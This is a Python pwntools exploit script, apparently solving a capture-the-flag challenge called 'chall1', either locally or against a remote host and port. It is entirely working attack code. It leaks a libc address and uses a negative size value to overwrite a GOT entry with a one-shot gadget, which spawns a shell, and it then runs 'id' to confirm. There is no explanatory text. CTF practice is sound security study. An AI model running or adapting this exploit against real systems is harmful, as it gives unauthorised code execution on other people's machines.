#!/usr/bin/python
from pwn import *
import sys

HOST = ''
PORT = 0

LIBC = 0x067b58  # libc base
FUNC = 0x03d0d3  # one shot gadget
BASH = 0x17e0cf  # /bin/sh string incase system() falls in a good range (no nulls in it)

if len(sys.argv) > 1:
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

if len(HOST) > 0:
	LIBC = 0x067378  # libc base
	FUNC = 0x03cd10  # one shot gadget
	BASH = 0x17b8cf  # /bin/sh string incase system() falls in a good range (no nulls in it)

	io = remote(HOST, PORT)
else:

	io = process('../chall1')

io.recvuntil('challenges\n\n')

# step 1: leak

io.recvuntil(': ')  # size
io.sendline('10')

io.recvuntil(': ')  # data
io.send('xxxx\r')

io.recvuntil(': ')  # resp
leak = io.recvline().strip()
leak = u32(leak[-4:])
libc = leak - LIBC
func = libc + FUNC
bash = libc + BASH

log.info('leak:  0x%08x' % leak)
log.info('libc:  0x%08x' % libc)
log.info('func:  0x%08x' % func)

io.recvuntil(': ')  # more?
io.sendline('y')

# step 2: write GOT

io.recvuntil(': ')  # size
io.sendline('-1')

io.recvuntil(': ')  # data
io.sendline(p32(func)+'\x00'*60+'\x08'+p32(0x805202c))

io.recvuntil(': ')  # resp
io.recvline()

io.recvuntil(': ')  # more?
io.sendline('y')

# step 3: trigger

io.recvuntil(': ')  # size
io.sendline('-'+str(0x100000000 - bash))

io.recvuntil(': ')  # data
io.sendline()

# step 4: enjoy a nice shell
io.sendline('id')
log.success('shell: %s' % io.recvline().strip())
#io.interactive()
